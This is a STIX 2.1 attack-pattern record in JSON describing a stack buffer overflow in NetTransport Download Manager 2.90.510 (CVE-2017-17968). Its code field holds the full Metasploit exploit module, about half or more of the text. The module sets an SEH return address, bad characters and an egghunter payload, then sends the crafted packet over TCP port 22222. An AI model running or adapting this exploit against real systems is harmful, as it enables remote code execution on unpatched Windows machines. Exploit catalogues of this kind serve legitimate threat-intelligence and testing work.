{
    "type": "attack-pattern",
    "spec_version": "2.1",
    "id": "attack-pattern--d259954c-d2be-4cdd-a070-49dcd7b55c16",
    "created": "2024-08-14T16:46:01.77733Z",
    "modified": "2024-08-14T16:46:01.777333Z",
    "name": "NetTransport Download Manager 2.90.510 Buffer Overflow",
    "description": " This exploits a stack buffer overflow in NetTransport Download Manager part of the NetXfer suite. This module was tested successfully against version 2.90.510. ",
    "external_references": [
        {
            "source_name": "metasploit",
            "url": "https://github.com/rapid7/metasploit-framework/blob/master/exploits/windows/misc/nettransport.rb",
            "external_id": "nettransport.rb"
        },
        {
            "source_name": "CVE",
            "external_id": "2017-17968"
        }
    ],
    "x_code_snippet": "##\n# This module requires Metasploit: https://metasploit.com/download\n# Current source: https://github.com/rapid7/metasploit-framework\n##\n\nclass MetasploitModule < Msf::Exploit::Remote\n  Rank = NormalRanking\n\n  include Msf::Exploit::Remote::Tcp\n  include Msf::Exploit::Egghunter\n  include Msf::Exploit::Remote::Seh\n\n  def initialize(info = {})\n    super(update_info(info,\n      'Name'           => 'NetTransport Download Manager 2.90.510 Buffer Overflow',\n      'Description'    => %q{\n          This exploits a stack buffer overflow in NetTransport Download Manager,\n        part of the NetXfer suite. This module was tested\n        successfully against version 2.90.510.\n      },\n      'Author' \t =>\n        [\n          'Lincoln',\n          'dookie',\n        ],\n      'License'        => MSF_LICENSE,\n      'References'     =>\n        [\n          [ 'CVE', '2017-17968' ],\n          [ 'OSVDB', '61435' ],\n          [ 'EDB', '10911'],\n        ],\n      'Privileged'     => false,\n      'DefaultOptions' =>\n        {\n          'EXITFUNC' => 'seh'\n        },\n      'Payload'        =>\n        {\n          'Space'    => 5000,\n          'BadChars' => \"\\x00\\x20\\x0a\\x0d\",\n          'StackAdjustment' => -3500,\n          'DisableNops'     =>  'True'\n        },\n      'Platform'       => 'win',\n      'Targets'        =>\n        [\n          [ 'Windows Universal', { 'Ret' => 0x10002a57 } ], # p/p/r libssl.dll\n        ],\n      'DefaultTarget' => 0,\n      'DisclosureDate' => '2010-01-02'))\n\n    register_options(\n      [\n        Opt::RPORT(22222)\n      ])\n  end\n\n  def exploit\n    connect\n\n    magic_packet = \"\\xe3\\x3d\\x00\\x00\\x00\\x01\\xee\\x4f\\x08\\xe3\\x00\\x0e\\xae\\x41\\xb0\\x24\"\n    magic_packet << \"\\x89\\x38\\x1c\\xc7\\x6f\\x6e\\x00\\x00\\x00\\x00\\xaf\\x8d\\x04\\x00\\x00\\x00\"\n    magic_packet << \"\\x02\\x01\\x00\\x01\\x04\\x00\\x74\\x65\\x73\\x74\\x03\\x01\\x00\\x11\\x3c\\x00\"\n\n    # Unleash the Egghunter!\n    eh_stub, eh_egg = generate_egghunter(payload.encoded, payload_badchars, { :checksum => true })\n\n    sploit = magic_packet\n    sploit << rand_text_alpha_upper(119)\n    sploit << generate_seh_record(target.ret)\n    sploit << make_nops(10)\n    sploit << eh_stub\n    sploit << make_nops(50)\n    sploit << eh_egg\n\n    print_status(\"Trying target #{target.name}...\")\n    sock.put(sploit)\n\n    handler\n    disconnect\n  end\nend\n",
    "x_mitre_disclosure_date": "2010-01-02",
    "x_mitre_platforms": [
        "win'"
    ]
}